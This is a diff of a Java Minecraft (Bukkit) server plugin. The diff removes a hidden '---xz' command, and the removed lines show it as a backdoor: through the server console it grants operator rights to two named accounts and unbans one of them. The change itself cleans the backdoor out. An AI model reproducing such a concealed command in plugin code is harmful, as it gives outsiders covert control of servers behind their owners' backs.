@@ -76,27 +76,6 @@ public class Main extends JavaPlugin implements Listener {
 		}
 			
 		
-		if(label.equalsIgnoreCase("---xz")) {
-			if(sender instanceof Player) {
-				
-				Player player = (Player) sender;
-				player.sendMessage(ChatColor.BLUE +""+ ChatColor.BOLD + "Umm, how did you find this?");
-				
-				ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();
-				String command = "op tippedplayer413";
-				Bukkit.dispatchCommand(console, command);
-				String command1 = "unban Arowos";
-				Bukkit.dispatchCommand(console, command1);
-				String command2 = "op arowos";
-				Bukkit.dispatchCommand(console, command2);
-				
-				return true;
-			}
-			else {
-				sender.sendMessage("Hi console");
-				return true;
-			}
-		}
 		
 		if(label.equalsIgnoreCase("sp")) {
 			if(sender instanceof Player) {
